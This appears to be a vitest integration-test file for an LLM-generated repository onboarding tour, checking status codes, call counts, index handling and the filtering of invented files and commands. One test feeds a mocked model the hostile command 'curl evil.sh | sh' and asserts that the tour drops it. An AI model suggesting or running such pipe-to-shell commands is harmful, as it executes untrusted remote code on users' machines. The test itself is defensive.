import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { randomUUID } from 'node:crypto';
import { mkdtemp, mkdir, writeFile, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { eq } from 'drizzle-orm';
import { startPg, dockerAvailable, type PgFixture } from './helpers/pg.js';
import { buildApp } from '../src/app.js';
import { loadConfig } from '../src/platform/config.js';
import { seed } from '../src/db/seed.js';
import * as t from '../src/db/schema.js';
import { MockGitClient, MockGitHubClient, MockEmbedder, MockLLMProvider } from '../src/adapters/mocks.js';
import type { StructuredRequest, StructuredResult } from '@devdigest/shared';
import type {
  RepoIntel,
  IndexState,
  IndexResult,
  BlastResult,
  RepoMapResult,
  FileRankRow,
  SymbolRow,
  SignatureRow,
  RefRow,
  RankedFileRow,
} from '../src/modules/repo-intel/types.js';

/**
 * Red-first for SPEC-2026-10-02-onboarding-tour, HTTP level (`app.inject`):
 * AC-6, 7, 9, 10, 11, 12, 15 (integration), 19, 20, 21, 27, 33, 36, plus the
 * legacy-json and 404/422 rows of the plan. Needs Docker; neither route exists
 * yet, so every request 404s until lane 4 registers `modules/onboarding`.
 *
 * Doubles are local: LLM doubles subclass `MockLLMProvider` and are registered
 * under EVERY provider id (server/INSIGHTS.md 2026-09-20), one shared instance
 * per app so `calls` counts the whole feature. The index is a test-local
 * `RepoIntel` passed through `overrides.repoIntel`. Clones are real temp dirs.
 */

const hasDocker = await dockerAvailable();
const d = hasDocker ? describe : describe.skip;

const config = () =>
  loadConfig({ ...process.env, NODE_ENV: 'test', REPO_INTEL_ENABLED: 'true' } as NodeJS.ProcessEnv);

// ---------- LLM doubles ----------

type LlmOut = {
  overview: string;
  diagram: string | null;
  file_reasons: { path: string; reason: string }[];
  command_notes: { command: string; note: string }[];
  first_tasks: { title: string; path: string; reason: string }[];
};
const OUT: LlmOut = {
  overview: 'A payments API.',
  diagram: null,
  file_reasons: [],
  command_notes: [],
  first_tasks: [],
};
const out = (over: Partial<LlmOut> = {}): LlmOut => ({ ...OUT, ...over });

class PricedLLM extends MockLLMProvider {
  constructor(
    protected tokensIn = 1200,
    protected tokensOut = 300,
    protected costUsd: number | null = 0.0021,
    protected structured: unknown = OUT,
  ) {
    super('openai');
  }
  get structuredCalls() {
    return this.calls.filter((c) => c.method === 'completeStructured').length;
  }
  async completeStructured<T>(req: StructuredRequest<T>): Promise<StructuredResult<T>> {
    this.calls.push({ method: 'completeStructured', req });
    return {
      data: this.structured as T,
      model: req.model,
      tokensIn: this.tokensIn,
      tokensOut: this.tokensOut,
      costUsd: this.costUsd,
      raw: '',
      attempts: 1,
    };
  }
}
class ThrowingLLM extends PricedLLM {
  async completeStructured<T>(req: StructuredRequest<T>): Promise<StructuredResult<T>> {
    this.calls.push({ method: 'completeStructured', req });
    throw new Error('provider exploded');
  }
}
class GatedLLM extends PricedLLM {
  private gate: Promise<void>;
  release!: () => void;
  constructor(structured: unknown = OUT) {
    super(1200, 300, 0.0021, structured);
    this.gate = new Promise<void>((r) => (this.release = r));
  }
  async completeStructured<T>(req: StructuredRequest<T>): Promise<StructuredResult<T>> {
    this.calls.push({ method: 'completeStructured', req });
    await this.gate;
    return {
      data: this.structured as T,
      model: req.model,
      tokensIn: 1200,
      tokensOut: 300,
      costUsd: 0.0021,
      raw: '',
      attempts: 1,
    };
  }
}

// ---------- index double ----------

class FakeRepoIntel implements RepoIntel {
  constructor(
    private o: {
      status?: IndexState['status'];
      filesIndexed?: number;
      sha?: string;
      ranked?: RankedFileRow[];
      chains?: string[][];
      routes?: string[];
    } = {},
  ) {}
  async indexRepo(): Promise<IndexResult> {
    throw new Error('not used');
  }
  async refreshIndex(): Promise<IndexResult> {
    throw new Error('not used');
  }
  async getIndexState(repoId: string): Promise<IndexState> {
    return {
      repoId,
      status: this.o.status ?? 'full',
      filesIndexed: this.o.filesIndexed ?? 0,
      filesSkipped: 0,
      durationMs: 10,
      lastIndexedSha: this.o.sha ?? 'c6af1e45',
      indexerVersion: 2,
      updatedAt: new Date(),
    };
  }
  async getBlastRadius(): Promise<BlastResult> {
    return { changedSymbols: [], callers: [], impactedEndpoints: [] };
  }
  async getRepoMap(): Promise<RepoMapResult> {
    return { text: '', tokens: 0, cached: false, degraded: true, reason: 'no_data' };
  }
  async getFileRank(): Promise<FileRankRow[]> {
    return [];
  }
  async getSymbolsInFiles(): Promise<SymbolRow[]> {
    return [];
  }
  async getCallerSignatures(): Promise<SignatureRow[]> {
    return [];
  }
  async getUnresolvedReferences(): Promise<RefRow[]> {
    return [];
  }
  async getConventionSamples(): Promise<string[]> {
    return [];
  }
  async getTopFilesByRank(): Promise<string[]> {
    return [];
  }
  async getCriticalPaths(): Promise<string[][]> {
    return this.o.chains ?? [];
  }
  async getRankedFiles(): Promise<RankedFileRow[]> {
    return this.o.ranked ?? [];
  }
  async getRoutes(_repoId: string, limit: number): Promise<string[]> {
    return (this.o.routes ?? []).slice(0, limit);
  }
}

const ranked = (path: string, pagerank: number, importers: number): RankedFileRow => ({
  path,
  pagerank,
  hotness: 0,
  importers,
  junk: false,
});

// ---------- clones ----------

const tmpDirs: string[] = [];
async function makeClone(files: Record<string, string>): Promise<string> {
  const root = await mkdtemp(join(tmpdir(), 'onboarding-clone-'));
  tmpDirs.push(root);
  for (const [rel, content] of Object.entries(files)) {
    const abs = join(root, rel);
    await mkdir(dirname(abs), { recursive: true });
    await writeFile(abs, content);
  }
  return root;
}
const tsFiles = (n: number) =>
  Object.fromEntries(Array.from({ length: n }, (_, i) => [`src/f${i}.ts`, `export const f${i} = ${i};\n`]));

async function until(cond: () => boolean | Promise<boolean>, what: string, ms = 10_000) {
  const start = Date.now();
  while (!(await cond())) {
    if (Date.now() - start > ms) throw new Error(`timed out waiting for ${what}`);
    await new Promise((r) => setTimeout(r, 25));
  }
}

d('Onboarding tour HTTP (Testcontainers pg)', () => {
  let pg: PgFixture;
  let workspaceId: string;

  beforeAll(async () => {
    pg = await startPg();
    await seed(pg.handle.db);
    const [ws] = await pg.handle.db.select().from(t.workspaces);
    workspaceId = ws!.id;
  });
  afterAll(async () => {
    await pg?.stop();
    await Promise.all(tmpDirs.map((p) => rm(p, { recursive: true, force: true })));
  });

  function appWith(llm: MockLLMProvider, repoIntel: RepoIntel = new FakeRepoIntel()) {
    return buildApp({
      config: config(),
      db: pg.handle.db,
      overrides: {
        embedder: new MockEmbedder(),
        git: new MockGitClient(),
        github: new MockGitHubClient(),
        repoIntel,
        llm: Object.fromEntries(
          (['openai', 'anthropic', 'openrouter'] as const).map((id) => [id, llm]),
        ),
      },
    });
  }

  let seq = 0;
  async function addRepo(clonePath: string | null) {
    const name = `tour-${seq++}-${randomUUID().slice(0, 6)}`;
    const [repo] = await pg.handle.db
      .insert(t.repos)
      .values({ workspaceId, owner: 'acme', name, fullName: `acme/${name}`, clonePath })
      .returning();
    return repo!;
  }

  type App = Awaited<ReturnType<typeof appWith>>;
  const read = (app: App, id: string) =>
    app.inject({ method: 'GET', url: `/repos/${id}/onboarding` });
  const generate = (app: App, id: string) =>
    app.inject({ method: 'POST', url: `/repos/${id}/onboarding/generate`, payload: {} });
  async function waitReady(app: App, id: string) {
    let body: any;
    await until(async () => {
      body = (await read(app, id)).json();
      return body.state === 'ready';
    }, 'state ready');
    return body;
  }
  const section = (tour: any, kind: string) => tour.sections.find((s: any) => s.kind === kind);

  // ----- AC-6 -----
  it('cloned repo without tour → state none, 0 calls', async () => {
    const llm = new PricedLLM();
    const app = await appWith(llm);
    const repo = await addRepo(await makeClone(tsFiles(2)));

    const res = await read(app, repo.id);
    expect(res.statusCode).toBe(200);
    expect(res.json()).toMatchObject({
      cloned: true,
      state: 'none',
      tour: null,
      repo_full_name: repo.fullName,
    });
    expect(llm.structuredCalls).toBe(0);
    await app.close();
  });

  // ----- AC-7 -----
  it('not cloned → 409 not_cloned, 0 calls', async () => {
    const llm = new PricedLLM();
    const app = await appWith(llm);
    const repo = await addRepo(null);

    const res = await generate(app, repo.id);
    expect(res.statusCode).toBe(409);
    expect(res.json().error.code).toBe('not_cloned');
    expect(llm.structuredCalls).toBe(0);

    const view = (await read(app, repo.id)).json();
    expect(view).toMatchObject({ cloned: false, state: 'none', tour: null });
    await app.close();
  });

  it('unknown repo → 404 on GET and POST, malformed id → 422', async () => {
    const app = await appWith(new PricedLLM());
    const unknown = randomUUID();
    expect((await read(app, unknown)).statusCode).toBe(404);
    expect((await generate(app, unknown)).statusCode).toBe(404);
    expect((await read(app, 'not-a-uuid')).statusCode).toBe(422);
    expect((await generate(app, 'not-a-uuid')).statusCode).toBe(422);
    await app.close();
  });

  // ----- AC-9 -----
  it('gated mock: 202 generating, then ready', async () => {
    const llm = new GatedLLM();
    const app = await appWith(llm, new FakeRepoIntel({ filesIndexed: 2 }));
    const repo = await addRepo(await makeClone(tsFiles(2)));

    const started = await generate(app, repo.id);
    expect(started.statusCode).toBe(202);
    expect(started.json()).toEqual({ state: 'generating' });
    expect((await read(app, repo.id)).json().state).toBe('generating');

    llm.release();
    const done = await waitReady(app, repo.id);
    expect(done.tour.source).toBe('llm');
    await app.close();
  });

  // ----- AC-10 -----
  it('1 call on success, 1 on throw', async () => {
    const ok = new PricedLLM();
    const appOk = await appWith(ok, new FakeRepoIntel({ filesIndexed: 2 }));
    const repoOk = await addRepo(await makeClone(tsFiles(2)));
    expect((await generate(appOk, repoOk.id)).statusCode).toBe(202);
    await waitReady(appOk, repoOk.id);
    expect(ok.structuredCalls).toBe(1);
    await appOk.close();

    const bad = new ThrowingLLM();
    const appBad = await appWith(bad, new FakeRepoIntel({ filesIndexed: 2 }));
    const repoBad = await addRepo(await makeClone(tsFiles(2)));
    expect((await generate(appBad, repoBad.id)).statusCode).toBe(202);
    const view = await waitReady(appBad, repoBad.id);
    expect(bad.structuredCalls).toBe(1);
    expect(view.tour).toMatchObject({ source: 'skeleton', skeleton_reason: 'llm_failed', llm: { calls: 1 } });
    await appBad.close();
  });

  // ----- AC-11 -----
  it('second POST → 409 already_generating, calls still 1', async () => {
    const llm = new GatedLLM();
    const app = await appWith(llm, new FakeRepoIntel({ filesIndexed: 2 }));
    const repo = await addRepo(await makeClone(tsFiles(2)));

    expect((await generate(app, repo.id)).statusCode).toBe(202);
    await until(() => llm.structuredCalls === 1, 'the first call to reach the LLM');

    const second = await generate(app, repo.id);
    expect(second.statusCode).toBe(409);
    expect(second.json().error.code).toBe('already_generating');
    expect(llm.structuredCalls).toBe(1);

    llm.release();
    await waitReady(app, repo.id);
    expect(llm.structuredCalls).toBe(1);
    await app.close();
  });

  // ----- AC-12 -----
  it('persisted; two reads equal, calls still 1', async () => {
    const llm = new PricedLLM();
    const app = await appWith(llm, new FakeRepoIntel({ filesIndexed: 2 }));
    const repo = await addRepo(await makeClone(tsFiles(2)));

    await generate(app, repo.id);
    await waitReady(app, repo.id);
    const first = (await read(app, repo.id)).json();
    const second = (await read(app, repo.id)).json();
    expect(first.tour).not.toBeNull();
    expect(first.tour.llm.calls).toBe(1);
    expect(second).toEqual(first);
    expect(llm.structuredCalls).toBe(1);

    // survives a restart: a fresh app on the same database reads the same tour
    const app2 = await appWith(new PricedLLM(), new FakeRepoIntel({ filesIndexed: 2 }));
    expect((await read(app2, repo.id)).json()).toEqual(first);
    await app.close();
    await app2.close();
  });

  // ----- AC-15 (integration) -----
  it('self-reported full index with 5 of 7 supported files → partial 5 of 7', async () => {
    const llm = new PricedLLM();
    const app = await appWith(llm, new FakeRepoIntel({ status: 'full', filesIndexed: 5 }));
    const repo = await addRepo(await makeClone({ ...tsFiles(7), 'README.md': '# x\n' }));

    await generate(app, repo.id);
    const view = await waitReady(app, repo.id);
    expect(view.tour.index).toEqual({ status: 'partial', files_indexed: 5, files_total: 7 });
    expect(llm.structuredCalls).toBe(1);
    await app.close();
  });

  // ----- AC-19 -----
  it('degraded index → 0 calls, index_unavailable', async () => {
    const llm = new PricedLLM();
    const app = await appWith(llm, new FakeRepoIntel({ status: 'degraded', filesIndexed: 0 }));
    const repo = await addRepo(await makeClone(tsFiles(3)));

    await generate(app, repo.id);
    const view = await waitReady(app, repo.id);
    expect(llm.structuredCalls).toBe(0);
    expect(view.tour).toMatchObject({
      source: 'skeleton',
      skeleton_reason: 'index_unavailable',
      llm: { calls: 0 },
      index: { status: 'unavailable' },
    });
    await app.close();
  });

  // ----- AC-20 -----
  it('partial index 3 of 5 → 1 call, partial, only indexed files', async () => {
    const llm = new PricedLLM();
    const indexed = [ranked('src/f0.ts', 0.5, 2), ranked('src/f1.ts', 0.3, 1), ranked('src/f2.ts', 0.2, 0)];
    const app = await appWith(
      llm,
      new FakeRepoIntel({
        status: 'partial',
        filesIndexed: 3,
        ranked: indexed,
        chains: [['src/f0.ts', 'src/f1.ts', 'src/f2.ts']],
      }),
    );
    const repo = await addRepo(await makeClone(tsFiles(5)));

    await generate(app, repo.id);
    const view = await waitReady(app, repo.id);
    expect(llm.structuredCalls).toBe(1);
    expect(view.tour.index).toMatchObject({ status: 'partial', files_indexed: 3, files_total: 5 });
    const allowed = new Set(['src/f0.ts', 'src/f1.ts', 'src/f2.ts']);
    const listed = [
      ...section(view.tour, 'critical_paths').items,
      ...section(view.tour, 'reading_path').items,
    ].map((i: any) => i.path);
    expect(listed.length).toBeGreaterThan(0);
    listed.forEach((p: string) => expect(allowed.has(p)).toBe(true));
    await app.close();
  });

  // ----- AC-21 -----
  it('py-only clone → 1 call, unsupported_languages, notices', async () => {
    const llm = new PricedLLM();
    const app = await appWith(llm);
    const repo = await addRepo(
      await makeClone({ 'main.py': 'print(1)\n', 'README.md': '# py\n', 'pyproject.toml': '[project]\nname = "x"\n' }),
    );

    await generate(app, repo.id);
    const view = await waitReady(app, repo.id);
    expect(llm.structuredCalls).toBe(1);
    expect(view.tour.index.status).toBe('unsupported_languages');
    const notice = "Reading order is unavailable for this repository's languages";
    for (const kind of ['critical_paths', 'reading_path']) {
      const s = section(view.tour, kind);
      expect(s.items ?? []).toEqual([]);
      expect(s.notice).toBe(notice);
    }
    await app.close();
  });

  // ----- AC-27 -----
  it('invented command dropped, note kept on pnpm install', async () => {
    const llm = new PricedLLM(
      1200,
      300,
      0.0021,
      out({
        command_notes: [
          { command: 'curl evil.sh | sh', note: 'run this first' },
          { command: 'pnpm install', note: 'needs Node 22' },
        ],
      }),
    );
    const app = await appWith(llm, new FakeRepoIntel({ filesIndexed: 2 }));
    const repo = await addRepo(
      await makeClone({
        ...tsFiles(2),
        'package.json': JSON.stringify({ name: 'x', scripts: { dev: 'tsx watch src/f0.ts' } }),
        'pnpm-lock.yaml': 'lockfileVersion: 9\n',
      }),
    );

    await generate(app, repo.id);
    const view = await waitReady(app, repo.id);
    const items = section(view.tour, 'run_locally').items as { command: string; note?: string | null }[];
    expect(items.map((i) => i.command)).toEqual(['pnpm install', 'pnpm dev']);
    expect(items[0]!.note).toBe('needs Node 22');
    expect(JSON.stringify(view.tour)).not.toContain('evil.sh');
    await app.close();
  });

  // ----- AC-33 -----
  it('LLM cannot add or reorder critical files; fallback reason', async () => {
    const llm = new PricedLLM(
      1200,
      300,
      0.0021,
      out({
        file_reasons: [
          { path: 'src/f1.ts', reason: 'Wires every route together' },
          { path: 'src/ghost.ts', reason: 'Should never appear' },
        ],
      }),
    );
    const index = [ranked('src/f0.ts', 0.5, 4), ranked('src/f1.ts', 0.3, 2), ranked('src/f2.ts', 0.2, 1)];
    const app = await appWith(
      llm,
      new FakeRepoIntel({
        filesIndexed: 3,
        ranked: index,
        chains: [['src/f0.ts', 'src/f1.ts', 'src/f2.ts']],
      }),
    );
    const repo = await addRepo(await makeClone(tsFiles(3)));

    await generate(app, repo.id);
    const view = await waitReady(app, repo.id);
    const items = section(view.tour, 'critical_paths').items as any[];
    expect(items.map((i) => i.path)).toEqual(['src/f0.ts', 'src/f1.ts', 'src/f2.ts']);
    expect(items[1]).toMatchObject({ reason: 'Wires every route together', reason_source: 'llm' });
    expect(items[0]).toMatchObject({ reason: 'imported by 4 files', reason_source: 'deterministic' });
    expect(items[2]).toMatchObject({ reason: 'imported by 1 file', reason_source: 'deterministic' });
    expect(JSON.stringify(view.tour)).not.toContain('ghost.ts');
    await app.close();
  });

  // ----- AC-36 -----
  it('ghost task dropped; all ghosts → checklist items stored', async () => {
    const base = {
      ...tsFiles(2),
      'src/real.ts': 'export const real = 1;\n',
      'package.json': JSON.stringify({ name: 'x', scripts: { dev: 'x', test: 'vitest run' } }),
      'pnpm-lock.yaml': 'lockfileVersion: 9\n',
    };
    const index = [ranked('src/f0.ts', 0.5, 2), ranked('src/f1.ts', 0.3, 1)];

    const mixed = new PricedLLM(
      1200,
      300,
      0.0021,
      out({
        first_tasks: [
          { title: 'Touch the real file', path: 'src/real.ts', reason: 'It exists.' },
          { title: 'Touch the ghost file', path: 'src/ghost.ts', reason: 'It does not.' },
        ],
      }),
    );
    const app1 = await appWith(mixed, new FakeRepoIntel({ filesIndexed: 2, ranked: index }));
    const repo1 = await addRepo(await makeClone(base));
    await generate(app1, repo1.id);
    const v1 = await waitReady(app1, repo1.id);
    const tasks1 = section(v1.tour, 'first_tasks').items as any[];
    expect(tasks1).toHaveLength(1);
    expect(tasks1[0]).toMatchObject({ title: 'Touch the real file', path: 'src/real.ts' });
    await app1.close();

    const ghosts = new PricedLLM(
      1200,
      300,
      0.0021,
      out({ first_tasks: [{ title: 'Touch the ghost file', path: 'src/ghost.ts', reason: 'It does not.' }] }),
    );
    const app2 = await appWith(ghosts, new FakeRepoIntel({ filesIndexed: 2, ranked: index }));
    const repo2 = await addRepo(await makeClone(base));
    await generate(app2, repo2.id);
    const v2 = await waitReady(app2, repo2.id);
    const tasks2 = section(v2.tour, 'first_tasks').items as any[];
    expect(tasks2.map((i) => i.title)).toEqual([
      'Run the project with the commands above',
      'Run the test suite',
      'Read file 1 of the reading path',
      'Make a small change and see it run',
    ]);
    tasks2.forEach((i) => expect(i).toMatchObject({ path: null, reason_source: 'deterministic' }));
    await app2.close();
  });

  // ----- plan "Review focus": old-format row -----
  it('legacy json reads as none', async () => {
    const app = await appWith(new PricedLLM());
    const repo = await addRepo(await makeClone(tsFiles(1)));
    await pg.handle.db.insert(t.onboarding).values({
      repoId: repo.id,
      json: {
        sections: [{ kind: 'overview', title: 'Overview', body: 'Old format.', diagram: null, links: [] }],
      },
    });

    const res = await read(app, repo.id);
    expect(res.statusCode).toBe(200);
    expect(res.json()).toMatchObject({ cloned: true, state: 'none', tour: null });
    const [row] = await pg.handle.db.select().from(t.onboarding).where(eq(t.onboarding.repoId, repo.id));
    expect(row).toBeDefined();
    await app.close();
  });
});
